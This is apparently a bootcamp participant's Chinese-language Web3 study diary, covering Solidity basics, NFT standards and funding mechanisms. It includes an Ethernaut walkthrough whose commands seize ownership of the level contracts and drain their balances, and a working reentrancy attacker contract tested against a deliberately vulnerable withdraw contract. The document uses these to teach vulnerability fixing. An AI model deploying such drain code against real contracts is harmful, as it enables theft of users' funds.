---
timezone: UTC+8
---

# hwish39-byte

**GitHub ID:** hwish39-byte

**Telegram:** @jax2333

## Self-introduction

Web3 实习计划 2025 冬季实习生

## Notes

<!-- Content_START -->
# 2026-01-28
<!-- DAILY_CHECKIN_2026-01-28_START -->
## 做黑客松项目
<!-- DAILY_CHECKIN_2026-01-28_END -->

# 2026-01-27
<!-- DAILY_CHECKIN_2026-01-27_START -->

## 听圆桌会议，确定自己的黑客松选题
<!-- DAILY_CHECKIN_2026-01-27_END -->

# 2026-01-25
<!-- DAILY_CHECKIN_2026-01-25_START -->


## 继续学习uniswap.......
<!-- DAILY_CHECKIN_2026-01-25_END -->

# 2026-01-24
<!-- DAILY_CHECKIN_2026-01-24_START -->



## 今天开始学习uniswap，了解了一些基础的概念
<!-- DAILY_CHECKIN_2026-01-24_END -->

# 2026-01-23
<!-- DAILY_CHECKIN_2026-01-23_START -->




## 今天听了有关**Speedrun Basic workshop的分享会，参加了第二周例会，完成了入门技术完挑战 Challenge #0 - Tokenization**
<!-- DAILY_CHECKIN_2026-01-23_END -->

# 2026-01-22
<!-- DAILY_CHECKIN_2026-01-22_START -->





## 今天完成了入门技术中的任务，针对ethernaut前三关做了一份攻略

### level 0：**Hello Ethernaut**（教学关）

-   **查看第一条线索**
    

```
await contract.info()
```

它会告诉你调用info1（）。

-   **跟随线索**
    

```
await contract.info1()
```

它会告诉你尝试调用 info2()，但需要传一个字符串 "hello" 作为参数。

-   **继续调用**
    

```
await contract.info2("hello")
```

它会提到 infoNum 这个属性。

-   **查看属性值**
    

```
await contract.infoNum()
```

返回一个数字（通常是 42），提示你去调用对应的 info\[数字\]。

-   **调用对应编号的方法**
    

```
await contract.info42()
```

它会告诉你 theMethodName 是下一个方法的名称。

-   **获取真正的方法名**
    

```
await contract.theMethodName()
```

这会返回一个字符串，比如 'method7123949'。

-   **调用这个奇怪的方法**
    

```
await contract.method7123949() // 注意使用上一步返回的实际名称
```

它会告诉你：如果你知道密码（password），就调用 authenticate()。

-   **寻找密码**
    

```
await contract.password()
```

它会返回一个字符串（例如 "ethernaut0"）。

-   **最后一步：认证**
    

```
await contract.authenticate("ethernaut0")
```

此时 MetaMask 会再次弹出，要求你支付一笔交易。确认后等待交易上链。

### 回到网页底部，点击 **"Submit Instance"**。如果一切顺利，你会看到通关成功的提示。

### level 1：**Fallback**

这一关的目标是：

1.  获得合约的**所有权 (owner)**。
    
2.  将合约里的 **余额 (balance) 清零**。
    

### 核心原理（漏洞所在）

观察合约代码，你会发现 receive() 函数（或者是旧版本的 fallback()）有一个逻辑漏洞：

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

这意味着：如果你曾经给合约贡献过一点点钱（contributions > 0），并且你现在直接往合约地址发送一笔钱（触发 receive），你就能直接变成 owner。

-   **进行一次小额贡献**
    

```
await contract.contribute({value: toWei('0.0001')})
```

点击 MetaMask 确认交易，等待完成。

-   **夺取所有权**
    

```
await contract.sendTransaction({value: toWei('0.0001')})
```

点击 MetaMask 确认交易。

-   **验证是否成为 Owner**
    

```
await contract.owner()
```

确认返回的是否是自己的地址

-   **提出所有的钱**
    

```
await contract.withdraw()
```

再次确认交易。

### 回到网页底部，点击 **"Submit Instance"**。

### level 2：**Fallout**

### 核心漏洞原理：

在早期的 Solidity 版本（0.5.0 之前）中，合约的**构造函数**（Constructor，即在部署时运行一次的函数）必须与**合约名完全一致**。而本文中function Fal1out()（注意中间那个是**数字 1**，而不是字母 **l**），这就导致Fal1out() 并没有变成构造函数，而是变成了一个**普通的、任何人都可以随时调用的公开函数**。由于这个函数的内容是 owner = msg.sender，所以任何人只要调用它，就能瞬间成为合约的主人。

-   **调用那个“写错”的函数**
    

```
await contract.Fal1out()
```

matamask确认这笔交易。这笔交易会将合约的 owner 修改为自己的钱包地址。

-   **检查是否成为了 Owner（可选）**
    

```
await contract.owner()
```

### 回到网页底部，点击 **"Submit Instance"**。
<!-- DAILY_CHECKIN_2026-01-22_END -->

# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->






## 今天首先完成了漏洞修复案例任务，完成了重入攻击漏洞修复，并编写了attack代码验证结果。

### 有漏洞代码，先转账再更新状态：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableWithdraw {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balance[msg.sender] > 0, "No balance");

        // ❌ 先转账，再更新状态（危险）
        (bool sent, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(sent, "Transfer failed");

        balance[msg.sender] = 0;
    }
}
```

### 无漏洞代码，先更新状态再转账：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeWithdraw {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balance[msg.sender];
        require(amount > 0, "No balance");

        // ✅ 先更新状态
        balance[msg.sender] = 0;

        // ✅ 再进行外部调用
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
    }
}
```

### attack代码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableWithdraw {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableWithdraw public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableWithdraw(_target);
        owner = msg.sender;
    }

    // 发起攻击
    function attack() external payable {
        require(msg.value > 0, "Need ETH");

        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // 重入点
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    // ✅ 使用 call 提现（推荐写法）
    function withdrawETH() external {
        require(msg.sender == owner, "Not owner");

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }
}
```

### 正常使用流程（看起来“没问题”）：

### Step 1：用户存钱：用户调用deposit value: 1 ether，状态变化：balance：1 ether

![QQ20260121-200322.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998060262-QQ20260121-200322.png)![QQ20260121-200340.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998370395-QQ20260121-200340.png)

### step 2：用户提现： withdraw（）**执行结果：**通过，向地址转 1 ETH，balance = 0

### attack运行过程：

### step 1：输入目标地址，deploy

![QQ20260121-200511.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998726310-QQ20260121-200511.png)

### step 2：执行攻击：attack value ：1 ether

![QQ20260121-200547.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999047384-QQ20260121-200547.png)

### 输出结果：attack地址下存在 2 ETH，而被攻击地址减少 2 ETH

![QQ20260121-200633.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999624881-QQ20260121-200633.png)![QQ20260121-200558.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999413386-QQ20260121-200558.png)

### 对于无漏洞代码，执行attack后会直接报错：

![QQ20260121-200802.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999811283-QQ20260121-200802.png)

## 随后听了jeff老师关于uniswap的分享会，大佬讲得太好了，有许多还没听懂，只能以后慢慢看回放了。
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-20
<!-- DAILY_CHECKIN_2026-01-20_START -->







## 今天最重要的就是听了有关web3公共物品资金分配的分享会，受益良多，总结了一些内容。

**在经济学中，公共物品具有两个核心特征：**

-   **非竞争性 (Non-rivalrous)**：一个人使用该物品，不会减少其他人使用的质量或数量（如：开源代码、以太坊网络）。
    
-   **非排他性 (Non-excludable)**：无法有效地排除他人使用该物品，即便他们没有为此付费（如：公链节点、技术文档）。
    

**在 Web3 语境下，典型的公共物品包括：**

-   开源协议与标准（如 ERC-20 代码库）。
    
-   基础架构（如以太坊客户端、RPC 节点、区块浏览器）。
    
-   安全审计工具与公共研究。
    
-   开发者教育与社区治理。
    

### 由于公共物品无法直接通过买卖盈利，它们往往面临**资助不足**的困境。如果没有人愿意为“路灯”买单，网络就会因缺乏维护而变得脆弱。传统的解决方法是政府征税，而 Web3 则试图通过机制设计（Mechanism Design）来解决这个难题。

**核心资助机制（Web3 的创新实验）：**

-   **二次方融资 (Quadratic Funding, QF)**：
    
    -   _原理_：由 **Gitcoin** 推广。项目的资助额不取决于总金额，而是取决于**捐赠人数的平方**。
        
    -   _意义_：极大地放大了“社区共识”的力量。100 个人每人捐 1 元，比 1 个人捐 100 元能获得更多的匹配资金池奖励。它通过数学手段实现了“资金的民主化”。
        
-   **追溯性公共物品资助 (Retroactive Public Goods Funding, RPGF)**：
    
    -   _原理_：由 **Optimism** 提出。先由开发者自费建设，等产生社会价值后，由协议（如排序器收入）进行追溯性的“打赏”。
        
    -   _核心逻辑_：“回溯过去比预测未来更容易。”这为长期主义的开发者提供了退出路径。
        
-   **哈伯格税 (Harberger Tax)**：
    
    -   一种针对域名（如 ENS）或资产的税收机制，强迫资产始终保持在“最有能力发挥其价值”的人手中，税收则用于公共支出。
<!-- DAILY_CHECKIN_2026-01-20_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->








## 今天主要**完成挑战 Challenge #0 - Tokenization和通过了 Ethernaut 前 3 关，对nft有了更深的理解**
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-18
<!-- DAILY_CHECKIN_2026-01-18_START -->









## 今天主要听了分享会，从erc-721到erc-7962，总结了一些内容

### 核心概念对比：

-   **ERC-721 (Address-Based)**：
    
    -   **所有权逻辑**：代币属于一个 **以太坊地址**。合约内部记录的是 tokenId => address。
        
    -   **操作限制**：只有该地址的所有者（持有私钥并能发起交易的人）才能直接转移代币，且必须作为 msg.sender 支付 Gas 费。
        
    -   **透明度**：所有权是公开且永久关联的，任何人都可以在链上追踪某个地址持有的所有资产。
        
-   **ERC-7962 (Key-Hash-Based)**：
    
    -   **所有权逻辑**：代币属于一个 **Key Hash**（即 keccak256(key)）。所有权不再死死绑定在某个特定的以太坊地址上。\[[**1**](https://www.google.com/url?sa=E&q=https%3A%2F%2Fvertexaisearch.cloud.google.com%2Fgrounding-api-redirect%2FAUZIYQEpMufv9lwM-_rehuWdksFST8_tw61GzNEtOX9e9bDFiOo9MP7QJyv8EPfXsVoaLcPzSBmaha5GYPp2NnK4Tlau6Hm_LYg9zXSGd_ho8rp-ttSg9go4nvUeuxm7fp-Q-kNfBK3XCD97qyklz7hYZxEi5XcpMxXj6_pz2ORv7en6Mw%3D%3D)\]
        
    -   **操作限制**：通过 **EIP-712 签名** 来授权操作。只要你能提供符合 Key Hash 的有效签名，任何地址（第三方、转发器、企业账户）都可以帮你提交交易。
        
    -   **抽象化**：它实现了**所有权（Ownership）与执行权（Execution）的彻底分离**。
        

|   | ERC-721 (传统 NFT) | ERC-7962 (基于 Key Hash) |
| --- | --- | --- |
| 所有权标识 | 以太坊公开地址 (Address) | 密钥哈希 (Key Hash) |
| 转账验证 | 验证 msg.sender == owner | 验证 ECDSA 签名 是否匹配 Key Hash |
| Gas 支付 | 必须由所有者地址支付（或依赖代理合约 | 原生支持第三方代付 (Gas Sponsorship) |
| 隐私性 | 低（地址与资产强绑定，易被追踪） | 高（不暴露控制地址即可证明所有权） |
| 账户依赖 | 强依赖（必须有 EOA 账户） | 弱依赖（更像是一种“凭证”，不限定发起地址） |
| 批处理能力 | 弱 | 强（天然适合签名聚合和批量授权） |

### 个人思考：

1.  **所有权的“去中心化”进化：从“我是谁”到“我知道什么”**  
    ERC-721 的逻辑是“因为我是这个地址，所以我拥有它”；而 ERC-7962 的逻辑是“因为我知道这个密钥并能提供签名，所以我拥有它”。这种转变将所有权从**链上身份**（地址）解耦，变成了**纯粹的密码学证明**。这为“无私钥钱包”或“社交恢复”提供了更原生的底层支持。
    
2.  **解决 Web3 的“Gas 心理门槛”**  
    ERC-721 的最大痛点是新用户必须先买 ETH 才能转动 NFT。ERC-7962 通过签名授权，让“免 Gas 交易”成为代币的标准配置。项目方或服务商可以像 Web2 支付服务器费一样，为用户支付转账 Gas，这才是 Web3 走向 **Mass Adoption（大规模应用）** 的关键。
    
3.  **隐私与可追溯性的平衡**  
    ERC-721 让资产像透明鱼缸里的鱼；ERC-7962 引入了类似“隐身地址”的效果。你可以在不暴露常用钱包地址的情况下持有和证明资产。对于机构级应用或高净值用户，这种**所有权抽象带来的隐私保护**是刚需。
    
4.  **兼容性挑战**  
    ERC-721 已经拥有巨大的生态惯性（Opensea, MetaMask 等）。ERC-7962 作为一个较新的提案，其挑战不在于技术优劣，而在于**生态兼容**。它需要钱包和市场重新适配“签名授权”而非单纯的“地址轮询”。
<!-- DAILY_CHECKIN_2026-01-18_END -->

# 2026-01-17
<!-- DAILY_CHECKIN_2026-01-17_START -->










# 今天虽然没看什么，但是还是坚持打卡
<!-- DAILY_CHECKIN_2026-01-17_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->











## 今天主要学习了solidity入门基础知识

### Solidity 编程基础：构建去中心化逻辑的基石

-   **分类**：Smart Contract Development / EVM
    
-   **定义**：Solidity 是一种面向合约的、高级强类型编程语言，专门用于在以太坊虚拟机（EVM）上实现智能合约。它的语法受 C++、Python 和 JavaScript 影响。
    

-   **值类型 (Value Types)**：
    
    -   uint / int：无符号/有符号整数（uint256 是最常用的，对应 EVM 的 256 位字长）。
        
    -   address：保存以太坊地址（20 字节）。**address payable** 允许接收转账。
        
    -   bool：布尔值。
        

-   **引用类型 (Reference Types)**：
    
    -   **Structs**：自定义结构体。
        
    -   **Arrays**：定长或动态数组。
        
    -   **Mappings**：极其高效的键值对映射（mapping(address => uint)），类似于哈希表，但不可遍历。
        

### 三大内存结构 (Data Locations) —— **进阶关键**

在 Solidity 中，理解变量存在哪比变量是什么更重要，因为这直接关系到 **Gas 成本**：

-   **Storage**：永久存储在区块链上。非常昂贵，类比于硬盘。
    
-   **Memory**：函数执行期间存在的临时内存。成本较低，类比于 RAM。
    
-   **Calldata**：不可变的临时存储，通常用于存储函数参数。最便宜。
    

### 函数详解 (Functions)

-   **可见性 (Visibility)**：
    
    -   public：内部/外部均可调用。
        
    -   private：仅当前合约可见。
        
    -   internal：当前合约及继承合约可见。
        
    -   external：仅外部可见（通常更省 Gas）。
        

-   **状态修饰符**：
    
    -   view：只读，不修改状态。
        
    -   pure：不读取也不修改状态（如数学计算）。
        
    -   payable：允许函数接收 ETH。
        

### 错误处理 (Error Handling)

Solidity 采用“全有或全无”机制：

-   require(condition, "error message")：最常用，不满足条件则回滚（Revert）所有操作并退还剩余 Gas。
    
-   revert()：手动触发回滚。
    
-   assert(condition)：用于检查不应该发生的严重错误。
    

* * *
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->












## 今天主要听了rick老师的智能体AI与web3融合的分享会。
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->













## **今天主要听了两场有关安全与合规的分享交流会，总结了一些内容**

### 技术安全：从“代码漏洞”到“全栈防御”，Web3 的安全不仅是防御黑客，更是对“确定性”的守护。

-   **智能合约层**：这是安全事故的重灾区。
    
    -   _典型威胁_：**重入攻击 (Reentrancy)**、**整数溢出**、**权限控制缺失**（如 ownable 逻辑漏洞）。
        
    -   _防御进化_：从简单的“手动审计”演进为“形式化验证 (Formal Verification)”和“经济模型压力测试”。
        
-   **协议与基础设施层**：
    
    -   **预言机攻击 (Oracle Manipulation)**：黑客通过闪电贷操纵低流动性资产价格，导致借贷协议清算。
        
    -   **跨链桥安全**：跨链桥往往是资产的“资金池集中地”，其验证机制（如多签弱点）是系统性的单点故障。
        
-   **用户侧安全**：社会工程学、钓鱼签名（Permit 漏洞）、离线授权风险。
    

### 合规治理：从“混沌地带”到“法币桥梁”，合规是 Web3 资产进入主流金融市场的“窄门”。

-   **核心监管框架**：
    
    -   **KYC/AML (身份与反洗钱)**：这是法币入金（On-ramp）和出金（Off-ramp）的强制标准。
        
    -   **MiCA (欧盟加密资产市场法案)**：全球首个全面的加密监管体系，对稳定币发行商和交易所提出了极高的资本和透明度要求。
        
    -   **证券认定争议**：如美国 SEC 对“哪些代币属于证券”的界定（Howey Test），直接决定了项目的合法生存空间。
        
-   **隐私与监管的碰撞**：
    
    -   **Tornado Cash 事件**：标志着监管机构开始对“隐私协议”本身进行制裁，引发了关于“技术中立性”的大讨论。
        
    -   **反洗钱旅行规则 (Travel Rule)**：要求在跨地址转账超过一定额度时，必须附加收发双方的身份信息。
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->














## 今天主要阅读了021 学习以太坊第 2&3 章，了解了web3领域中合规与网络安全相关的内容。

## 以及铸造了第一个NFT

![mfnft.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-13-1768306490962-mfnft.png)
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->















## **今天是开营的第一天，学习内容上午主要看了web3实习手册入门导读部分，了解了区块链基础概念和以太坊概览**

## **区块链：**

### 核心机制：

1.  数据结构：由包含交易信息的“区块”通过 Parent Hash 形成的链式结构。每一个区块的哈希值都依赖前一个区块，形成天然的防篡改验证链路。
    
2.  共识协议：在没有中心化节点的情况下，通过 PoW (工作量证明) 或 PoS (权益证明) 等算法，解决分布式系统中的拜占庭将军问题，确保全网账本一致。
    
3.  P2P 网络：去中心化的点对点传输，消除了单点故障风险（SPOF）。
    

### 个人思考：

1.  从“信息互联网”到“价值互联网”的跃迁：传统互联网传递的是信息的“副本”（Copy），而区块链通过共识机制实现了数字资产的“唯一性”和“所有权确认”，传递的是价值。
    
2.  透明与隐私的边界：全网公开透明的账本带来了可追溯性，但也对隐私保护提出了挑战。未来的方向可能是零知识证明（ZKP）等密码学技术与底层账本的进一步结合。
    

## **以太坊：**

### 技术核心：

1.  EVM (以太坊虚拟机)：以太坊的“大脑”，一个全球化的、状态同步的图灵完备计算环境。它允许开发者在链上运行任意复杂的逻辑。
    
2.  智能合约 (Smart Contracts)：存储在区块链上的自动执行代码。一旦触发条件达成，执行结果由共识机制保证，无法人为干预。
    
3.  账户模型 (Account Model)：不同于比特币的 UTXO，以太坊使用状态转换模型。分为外部账户 (EOA) 和合约账户 (CA)，通过 Nonce 和 Balance 管理全局状态。
    
4.  Gas 机制：为计算资源定价。通过 Gas 限制了无限循环攻击（解决停机问题），同时作为激励机制防止网络拥堵和资源滥用。
    

### 个人思考：

1.  从“计算器”到“智能手机”：如果说比特币是功能单一但极度稳健的“计算器”，那么以太坊就是“可编程的智能手机”。它最伟大的贡献不是以太币本身，而是定义了一套标准，让开发者可以像搭积木一样构建去中心化金融（DeFi）和应用。
    
2.  代码即铁律的两面性：智能合约赋予了交易极高的透明度和自动化能力，但也意味着“Bug 即资产损失”。在没有传统法律回滚机制的语境下，对代码审计和形式化验证的需求被提升到了前所未有的高度。
    

## **随后注册了metamask钱包，尝试发送了第一笔sepolia，在metamask中，注意到ethereum、bitcoin、solana三者地址不同，其余地址均与ethereum相同，去查询了以上三者的异同点。**

### 核心差异对照表：

| 特性 (Features) | Bitcoin (BTC) | Ethereum (ETH) | Solana (SOL) |
| --- | --- | --- | --- |
| 核心定位 | 价值存储 (数字黄金) | 去中心化计算平台 (世界计算机) | 高性能 Web3 底层 (高性能公链) |
| 共识机制 | PoW (工作量证明) | PoS (权益证明) | PoH (历史证明) + PoS |
| 智能合约 | 极其有限 (非图灵完备) | 图灵完备 (EVM) | 图灵完备 (Sealevel/Rust) |
| 交易吞吐量 (TPS) | ~ 7 | ~ 15 - 30 (L1 层) | 50,000+ |
| 区块确认时间 | ~ 10 分钟 | ~ 12 秒 | ~ 400 毫秒 |
| 账本模型 | UTXO (未花费交易输出) | Account (账户模型) | Account (数据与逻辑分离) |
| 可扩展性路线 | 侧链/闪电网络 (L2) | 以 Rollup 为中心的模块化 L2 | 单体高性能 (L1 层硬核扩容) |

### 个人思考：

1.  “不可能三角”的取舍：这三者代表了对“去中心化、安全、高性能”三个维度的不同优先级的选择。Bitcoin 选择了极致的安全与去中心化，放弃了性能；Solana 选择了极致的性能，但在去中心化程度（节点硬件门槛）上做出了让步；Ethereum 则在尝试通过 L2 架构来兼顾三者。
    
2.  执行环境的进化（串行 vs 并行）：EVM 的执行是串行的，这限制了其处理能力；而 Solana 的优势在于其并行处理能力（Sealevel），能够同时处理不相关的交易。这说明未来公链的竞争不仅是共识算法的竞争，更是计算机体系架构（CPU/并发利用率）的竞争。
    
3.  资产属性 vs 应用属性：比特币的简单性使其成为最稳健的资产底层；以太坊的生态粘性来自于其深厚的流动性和开发者组合性（L2 生态）；Solana 则在挑战高频交易场景（如订单簿 DEX）。技术没有绝对优劣，只有应用场景的适配性。
    

## **随后发送eth时，注意到转账0.05eth消耗0.000034eth，随后去查询了gas的计算方法：**

### 核心公式：

![QQ20260112-205400.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-12-1768223803892-QQ20260112-205400.png)

### 在此次交易中：

-   总单价 (Gas Price) = 0.116248951+1.5=1.6162489510.116248951+1.5=1.616248951 Gwei
    
-   总费用 (Gwei) = 21,000×1.616248951=33,941.22797121,000×1.616248951=33,941.227971 Gwei
    
-   换算为 ETH = 33,941.227971÷1,000,000,000≈0.0000339433,941.227971÷1,000,000,000≈**0.00003394** ETH
    

### 个人思考：

-   小费（Priority Fee）成了“大头”：在这笔交易中，小费 (1.5) 竟然是基础费 (0.116) 的 12.9 倍。支付了远超市场必需的溢价。思考能否从这个方面进行gas消耗优化。
    

## **从区块链的去中心化信任哲学，到三大公链在‘不可能三角’中的架构取舍，再到以太坊 Gas 机制底层精确的算力定价模型，今天的学习让我深刻理解了 Web3 世界是如何通过数学与代码将‘信用’转化为一种可量化的生产力。**
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
